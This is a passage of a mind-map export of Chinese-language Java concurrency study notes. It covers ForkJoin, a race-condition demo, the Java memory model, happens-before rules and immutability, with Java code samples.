      主要用于并行计算中，和 MapReduce 原理类似，都是把大的计算任务拆分成多个小任务并行计算。
    </p>
    <pre>public class ForkJoinExample extends RecursiveTask&lt;Integer&gt; {
    private final int threshold = 5;
    private int first;
    private int last;
    public ForkJoinExample(int first, int last) {
        this.first = first;
        this.last = last;
    }
    @Override
    protected Integer compute() {
        int result = 0;
        if (last - first &lt;= threshold) {
            // 任务足够小则直接计算
            for (int i = first; i &lt;= last; i++) {
                result += i;
            }
        } else {
            // 拆分成小任务
            int middle = first + (last - first) / 2;
            ForkJoinExample leftTask = new ForkJoinExample(first, middle);
            ForkJoinExample rightTask = new ForkJoinExample(middle + 1, last);
            leftTask.fork();
            rightTask.fork();
            result = leftTask.join() + rightTask.join();
        }
        return result;
    }
}</pre>
    <pre>public static void main(String[] args) throws ExecutionException, InterruptedException {
    ForkJoinExample example = new ForkJoinExample(1, 10000);
    ForkJoinPool forkJoinPool = new ForkJoinPool();
    Future result = forkJoinPool.submit(example);
    System.out.println(result.get());
}</pre>
    <p dir="auto">
      ForkJoin 使用 ForkJoinPool 来启动，它是一个特殊的线程池，线程数量取决于 CPU 核数。
    </p>
    <pre>public class ForkJoinPool extends AbstractExecutorService</pre>
    <p dir="auto">
      ForkJoinPool 实现了工作窃取算法来提高 CPU 的利用率。每个线程都维护了一个双端队列，用来存储需要执行的任务。工作窃取算法允许空闲的线程从其它线程的双端队列中窃取一个任务来执行。窃取的任务必须是最晚的任务，避免和队列所属线程发生竞争。例如下图中，Thread2 从 Thread1 的队列中拿出最晚的 Task1 任务，Thread1 会拿出 Task2 来执行，这样就避免发生竞争。但是如果队列中只有一个任务时还是会发生竞争。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5a325c8e0a8e7e387b0f983ed39fd2b8b3cc4c25246310784736c1d81cf1788a/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f65343266313838662d663461392d346536662d383866632d3435663436383230373266622e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/5a325c8e0a8e7e387b0f983ed39fd2b8b3cc4c25246310784736c1d81cf1788a/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f65343266313838662d663461392d346536662d383866632d3435663436383230373266622e706e67" width="300px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e42f188f-f4a9-4e6f-88fc-45f4682072fb.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1518564479" CREATED="1754750650577" MODIFIED="1754750650578"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      九、线程不安全示例
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 九、线程不安全示例" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#九线程不安全示例">
</a>
    <p dir="auto">
      如果多个线程对同一个共享数据进行访问而不采取同步操作的话，那么操作的结果是不一致的。
    </p>
    <p dir="auto">
      以下代码演示了 1000 个线程同时对 cnt 执行自增操作，操作结束之后它的值有可能小于 1000。
    </p>
    <pre>public class ThreadUnsafeExample {
    private int cnt = 0;
    public void add() {
        cnt++;
    }
    public int get() {
        return cnt;
    }
}</pre>
    <pre>public static void main(String[] args) throws InterruptedException {
    final int threadSize = 1000;
    ThreadUnsafeExample example = new ThreadUnsafeExample();
    final CountDownLatch countDownLatch = new CountDownLatch(threadSize);
    ExecutorService executorService = Executors.newCachedThreadPool();
    for (int i = 0; i &lt; threadSize; i++) {
        executorService.execute(() -&gt; {
            example.add();
            countDownLatch.countDown();
        });
    }
    countDownLatch.await();
    executorService.shutdown();
    System.out.println(example.get());
}</pre>
    <pre>997</pre>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1458776693" CREATED="1754750650579" MODIFIED="1754750650581"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十、Java 内存模型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十、Java 内存模型" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#十java-内存模型">
</a>
    <p dir="auto">
      Java 内存模型试图屏蔽各种硬件和操作系统的内存访问差异，以实现让 Java 程序在各种平台下都能达到一致的内存访问效果。
    </p>
  </body>
</html></richcontent>
<node ID="ID_670951714" CREATED="1754750650581" MODIFIED="1754750650583"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      主内存与工作内存
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 主内存与工作内存" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#主内存与工作内存">
</a>
    <p dir="auto">
      处理器上的寄存器的读写的速度比内存快几个数量级，为了解决这种速度矛盾，在它们之间加入了高速缓存。
    </p>
    <p dir="auto">
      加入高速缓存带来了一个新的问题：缓存一致性。如果多个缓存共享同一块主内存区域，那么多个缓存的数据可能会不一致，需要一些协议来解决这个问题。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/21d02d3e4f21bfc65a57a4c85b127c8cb4632ab7c54b78fb7423a458bb6c8b73/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39343263613064322d396435632d343561342d383963622d3566643839623631393133662e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/21d02d3e4f21bfc65a57a4c85b127c8cb4632ab7c54b78fb7423a458bb6c8b73/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39343263613064322d396435632d343561342d383963622d3566643839623631393133662e706e67" width="600px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/942ca0d2-9d5c-45a4-89cb-5fd89b61913f.png"/>
    </a><br/>
    

    <p dir="auto">
      所有的变量都存储在主内存中，每个线程还有自己的工作内存，工作内存存储在高速缓存或者寄存器中，保存了该线程使用的变量的主内存副本拷贝。
    </p>
    <p dir="auto">
      线程只能直接操作工作内存中的变量，不同线程之间的变量值传递需要通过主内存来完成。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/773f938d79b1696bfb1e6c84a0cd4a44610605add89208150d3a88a364d8ea03/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31353835313535352d356162632d343937642d616433342d6566656431306634336136622e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/773f938d79b1696bfb1e6c84a0cd4a44610605add89208150d3a88a364d8ea03/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31353835313535352d356162632d343937642d616433342d6566656431306634336136622e706e67" width="600px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/15851555-5abc-497d-ad34-efed10f43a6b.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1296968959" CREATED="1754750650583" MODIFIED="1754750650585"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      内存间交互操作
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 内存间交互操作" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#内存间交互操作">
</a>
    <p dir="auto">
      Java 内存模型定义了 8 个操作来完成主内存和工作内存的交互操作。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e3a100334a232e77581a50090dc3edd860d58b559805624e43015ad5eeb76b76/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38623765626261642d393630342d343337352d383465332d6634313230393964313730632e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/e3a100334a232e77581a50090dc3edd860d58b559805624e43015ad5eeb76b76/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38623765626261642d393630342d343337352d383465332d6634313230393964313730632e706e67" width="450px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8b7ebbad-9604-4375-84e3-f412099d170c.png"/>
    </a><br/>
    

    <ul dir="auto">
      <li>
        read：把一个变量的值从主内存传输到工作内存中
      </li>
      <li>
        load：在 read 之后执行，把 read 得到的值放入工作内存的变量副本中
      </li>
      <li>
        use：把工作内存中一个变量的值传递给执行引擎
      </li>
      <li>
        assign：把一个从执行引擎接收到的值赋给工作内存的变量
      </li>
      <li>
        store：把工作内存的一个变量的值传送到主内存中
      </li>
      <li>
        write：在 store 之后执行，把 store 得到的值放入主内存的变量中
      </li>
      <li>
        lock：作用于主内存的变量
      </li>
      <li>
        unlock
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1938292505" CREATED="1754750650585" MODIFIED="1754750650585"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      内存模型三大特性
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1391553144" CREATED="1754750650586" MODIFIED="1754750650588"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 原子性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 原子性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#1-原子性">
</a>
    <p dir="auto">
      Java 内存模型保证了 read、load、use、assign、store、write、lock 和 unlock 操作具有原子性，例如对一个 int 类型的变量执行 assign 赋值操作，这个操作就是原子性的。但是 Java 内存模型允许虚拟机将没有被 volatile 修饰的 64 位数据（long，double）的读写操作划分为两次 32 位的操作来进行，即 load、store、read 和 write 操作可以不具备原子性。
    </p>
    <p dir="auto">
      有一个错误认识就是，int 等原子性的类型在多线程环境中不会出现线程安全问题。前面的线程不安全示例代码中，cnt 属于 int 类型变量，1000 个线程对它进行自增操作之后，得到的值为 997 而不是 1000。
    </p>
    <p dir="auto">
      为了方便讨论，将内存间的交互操作简化为 3 个：load、assign、store。
    </p>
    <p dir="auto">
      下图演示了两个线程同时对 cnt 进行操作，load、assign、store 这一系列操作整体上看不具备原子性，那么在 T1 修改 cnt 并且还没有将修改后的值写入主内存，T2 依然可以读入旧值。可以看出，这两个线程虽然执行了两次自增运算，但是主内存中 cnt 的值最后为 1 而不是 2。因此对 int 类型读写操作满足原子性只是说明 load、assign、store 这些单个操作具备原子性。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8ed96ec6bc8a7b1e05cb4cb0202de983b0486290041edf2d49f020b0528c601c/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f32373937613630392d363864622d346437622d383730312d3431616339613334623134662e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/8ed96ec6bc8a7b1e05cb4cb0202de983b0486290041edf2d49f020b0528c601c/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f32373937613630392d363864622d346437622d383730312d3431616339613334623134662e6a7067" width="300px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2797a609-68db-4d7b-8701-41ac9a34b14f.jpg"/>
    </a><br/>
    

    <p dir="auto">
      AtomicInteger 能保证多个线程修改的原子性。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5529421e755a17089df4ce4d0f235e4db5979c4ee1fff95bbe9f13a429cbb8d3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f64643536333033372d666361612d346264382d383362362d6233396439336131326337372e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/5529421e755a17089df4ce4d0f235e4db5979c4ee1fff95bbe9f13a429cbb8d3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f64643536333033372d666361612d346264382d383362362d6233396439336131326337372e6a7067" width="300px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/dd563037-fcaa-4bd8-83b6-b39d93a12c77.jpg"/>
    </a><br/>
    

    <p dir="auto">
      使用 AtomicInteger 重写之前线程不安全的代码之后得到以下线程安全实现：
    </p>
    <pre>public class AtomicExample {
    private AtomicInteger cnt = new AtomicInteger();
    public void add() {
        cnt.incrementAndGet();
    }
    public int get() {
        return cnt.get();
    }
}</pre>
    <pre>public static void main(String[] args) throws InterruptedException {
    final int threadSize = 1000;
    AtomicExample example = new AtomicExample(); // 只修改这条语句
    final CountDownLatch countDownLatch = new CountDownLatch(threadSize);
    ExecutorService executorService = Executors.newCachedThreadPool();
    for (int i = 0; i &lt; threadSize; i++) {
        executorService.execute(() -&gt; {
            example.add();
            countDownLatch.countDown();
        });
    }
    countDownLatch.await();
    executorService.shutdown();
    System.out.println(example.get());
}</pre>
    <pre>1000</pre>
    <p dir="auto">
      除了使用原子类之外，也可以使用 synchronized 互斥锁来保证操作的原子性。它对应的内存间交互操作为：lock 和 unlock，在虚拟机实现上对应的字节码指令为 monitorenter 和 monitorexit。
    </p>
    <pre>public class AtomicSynchronizedExample {
    private int cnt = 0;
    public synchronized void add() {
        cnt++;
    }
    public synchronized int get() {
        return cnt;
    }
}</pre>
    <pre>public static void main(String[] args) throws InterruptedException {
    final int threadSize = 1000;
    AtomicSynchronizedExample example = new AtomicSynchronizedExample();
    final CountDownLatch countDownLatch = new CountDownLatch(threadSize);
    ExecutorService executorService = Executors.newCachedThreadPool();
    for (int i = 0; i &lt; threadSize; i++) {
        executorService.execute(() -&gt; {
            example.add();
            countDownLatch.countDown();
        });
    }
    countDownLatch.await();
    executorService.shutdown();
    System.out.println(example.get());
}</pre>
    <pre>1000</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1865672011" CREATED="1754750650589" MODIFIED="1754750650591"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 可见性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 可见性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#2-可见性">
</a>
    <p dir="auto">
      可见性指当一个线程修改了共享变量的值，其它线程能够立即得知这个修改。Java 内存模型是通过在变量修改后将新值同步回主内存，在变量读取前从主内存刷新变量值来实现可见性的。
    </p>
    <p dir="auto">
      主要有三种实现可见性的方式：
    </p>
    <ul dir="auto">
      <li>
        volatile
      </li>
      <li>
        synchronized，对一个变量执行 unlock 操作之前，必须把变量值同步回主内存。
      </li>
      <li>
        final，被 final 关键字修饰的字段在构造器中一旦初始化完成，并且没有发生 this 逃逸（其它线程通过 this 引用访问到初始化了一半的对象），那么其它线程就能看见 final 字段的值。
      </li>
    </ul>
    <p dir="auto">
      对前面的线程不安全示例中的 cnt 变量使用 volatile 修饰，不能解决线程不安全问题，因为 volatile 并不能保证操作的原子性。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_105415704" CREATED="1754750650592" MODIFIED="1754750650594"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 有序性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 有序性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#3-有序性">
</a>
    <p dir="auto">
      有序性是指：在本线程内观察，所有操作都是有序的。在一个线程观察另一个线程，所有操作都是无序的，无序是因为发生了指令重排序。在 Java 内存模型中，允许编译器和处理器对指令进行重排序，重排序过程不会影响到单线程程序的执行，却会影响到多线程并发执行的正确性。
    </p>
    <p dir="auto">
      volatile 关键字通过添加内存屏障的方式来禁止指令重排，即重排序时不能把后面的指令放到内存屏障之前。
    </p>
    <p dir="auto">
      也可以通过 synchronized 来保证有序性，它保证每个时刻只有一个线程执行同步代码，相当于是让线程顺序执行同步代码。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1542472312" CREATED="1754750650594" MODIFIED="1754750650595"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      先行发生原则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 先行发生原则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#先行发生原则">
</a>
    <p dir="auto">
      上面提到了可以用 volatile 和 synchronized 来保证有序性。除此之外，JVM 还规定了先行发生原则，让一个操作无需控制就能先于另一个操作完成。
    </p>
  </body>
</html></richcontent>
<node ID="ID_619100878" CREATED="1754750650595" MODIFIED="1754750650598"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 单一线程原则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 单一线程原则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#1-单一线程原则">
</a>
    <blockquote>
      <p dir="auto">
        Single Thread rule
      </p>
    </blockquote>
    <p dir="auto">
      在一个线程内，在程序前面的操作先行发生于后面的操作。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/888c1d7cb30319264b5ba735476cc8e28ca32da3301565f8ebd9e76bd5ae0526/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38373462336666372d376335632d346537612d623861622d6138326133653033386432302e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/888c1d7cb30319264b5ba735476cc8e28ca32da3301565f8ebd9e76bd5ae0526/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38373462336666372d376335632d346537612d623861622d6138326133653033386432302e706e67" width="180px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/874b3ff7-7c5c-4e7a-b8ab-a82a3e038d20.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1815522602" CREATED="1754750650598" MODIFIED="1754750650600"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 管程锁定规则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 管程锁定规则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#2-管程锁定规则">
</a>
    <blockquote>
      <p dir="auto">
        Monitor Lock Rule
      </p>
    </blockquote>
    <p dir="auto">
      一个 unlock 操作先行发生于后面对同一个锁的 lock 操作。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e6b0b7b735c5a382444f93a8632f56ef56583b4c7142087af1da963a239d55f9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38393936613533372d376334612d346563382d613362372d3765663137393865616532362e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/e6b0b7b735c5a382444f93a8632f56ef56583b4c7142087af1da963a239d55f9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38393936613533372d376334612d346563382d613362372d3765663137393865616532362e706e67" width="350px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8996a537-7c4a-4ec8-a3b7-7ef1798eae26.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_670334461" CREATED="1754750650600" MODIFIED="1754750650601"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. volatile 变量规则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. volatile 变量规则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#3-volatile-变量规则">
</a>
    <blockquote>
      <p dir="auto">
        Volatile Variable Rule
      </p>
    </blockquote>
    <p dir="auto">
      对一个 volatile 变量的写操作先行发生于后面对这个变量的读操作。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5e6ac59654635acaa2e859ac8296c27dba8f460568d2451ca0e7cac4fbd6d05f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39343266333363392d386164392d343938372d383336662d3030376465346332316465302e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/5e6ac59654635acaa2e859ac8296c27dba8f460568d2451ca0e7cac4fbd6d05f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39343266333363392d386164392d343938372d383336662d3030376465346332316465302e706e67" width="400px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/942f33c9-8ad9-4987-836f-007de4c21de0.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1550405812" CREATED="1754750650602" MODIFIED="1754750650605"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 线程启动规则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 线程启动规则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#4-线程启动规则">
</a>
    <blockquote>
      <p dir="auto">
        Thread Start Rule
      </p>
    </blockquote>
    <p dir="auto">
      Thread 对象的 start() 方法调用先行发生于此线程的每一个动作。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5fc25fe77a76d47265350c7310ae15ba0ff4c74c2b8781c44feb6fd5a9853276/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36323730633231362d376563302d346462372d393464652d3030303362636533376364322e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/5fc25fe77a76d47265350c7310ae15ba0ff4c74c2b8781c44feb6fd5a9853276/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36323730633231362d376563302d346462372d393464652d3030303362636533376364322e706e67" width="380px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6270c216-7ec0-4db7-94de-0003bce37cd2.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_487186930" CREATED="1754750650606" MODIFIED="1754750650608"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 线程加入规则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. 线程加入规则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#5-线程加入规则">
</a>
    <blockquote>
      <p dir="auto">
        Thread Join Rule
      </p>
    </blockquote>
    <p dir="auto">
      Thread 对象的结束先行发生于 join() 方法返回。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/20b4b77d779ba2347496fe142446878c92ce66fb4072a76df8365cd94020cfe9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f32333366386438392d333164372d343133662d396330322d3034326631396334366261312e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/20b4b77d779ba2347496fe142446878c92ce66fb4072a76df8365cd94020cfe9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f32333366386438392d333164372d343133662d396330322d3034326631396334366261312e706e67" width="400px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/233f8d89-31d7-413f-9c02-042f19c46ba1.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1158163495" CREATED="1754750650608" MODIFIED="1754750650609"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 线程中断规则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 6. 线程中断规则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#6-线程中断规则">
</a>
    <blockquote>
      <p dir="auto">
        Thread Interruption Rule
      </p>
    </blockquote>
    <p dir="auto">
      对线程 interrupt() 方法的调用先行发生于被中断线程的代码检测到中断事件的发生，可以通过 interrupted() 方法检测到是否有中断发生。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_18572901" CREATED="1754750650610" MODIFIED="1754750650611"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. 对象终结规则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 7. 对象终结规则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#7-对象终结规则">
</a>
    <blockquote>
      <p dir="auto">
        Finalizer Rule
      </p>
    </blockquote>
    <p dir="auto">
      一个对象的初始化完成（构造函数执行结束）先行发生于它的 finalize() 方法的开始。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_143030433" CREATED="1754750650612" MODIFIED="1754750650614"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      8. 传递性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 8. 传递性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#8-传递性">
</a>
    <blockquote>
      <p dir="auto">
        Transitivity
      </p>
    </blockquote>
    <p dir="auto">
      如果操作 A 先行发生于操作 B，操作 B 先行发生于操作 C，那么操作 A 先行发生于操作 C。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_136751083" CREATED="1754750650614" MODIFIED="1754750650616"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十一、线程安全
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十一、线程安全" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#十一线程安全">
</a>
    <p dir="auto">
      多个线程不管以何种方式访问某个类，并且在主调代码中不需要进行同步，都能表现正确的行为。
    </p>
    <p dir="auto">
      线程安全有以下几种实现方式：
    </p>
  </body>
</html></richcontent>
<node ID="ID_763780570" CREATED="1754750650616" MODIFIED="1754750650618"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      不可变
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 不可变" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#不可变">
</a>
    <p dir="auto">
      不可变（Immutable）的对象一定是线程安全的，不需要再采取任何的线程安全保障措施。只要一个不可变的对象被正确地构建出来，永远也不会看到它在多个线程之中处于不一致的状态。多线程环境下，应当尽量使对象成为不可变，来满足线程安全。
    </p>
    <p dir="auto">
      不可变的类型：
    </p>
    <ul dir="auto">
      <li>
        final 关键字修饰的基本数据类型
      </li>
      <li>
        String
      </li>
      <li>
        枚举类型
      </li>
      <li>
        Number 部分子类，如 Long 和 Double 等数值包装类型，BigInteger 和 BigDecimal 等大数据类型。但同为 Number 的原子类 AtomicInteger 和 AtomicLong 则是可变的。
      </li>
    </ul>
    <p dir="auto">
      对于集合类型，可以使用 Collections.unmodifiableXXX() 方法来获取一个不可变的集合。
    </p>
    <pre>public class ImmutableExample {
    public static void main(String[] args) {
        Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;();
        Map&lt;String, Integer&gt; unmodifiableMap = Collections.unmodifiableMap(map);
        unmodifiableMap.put(&quot;a&quot;, 1);
    }
}</pre>
    <pre>Exception in thread &quot;main&quot; java.lang.UnsupportedOperationException
    at java.util.Collections$UnmodifiableMap.put(Collections.java:1457)
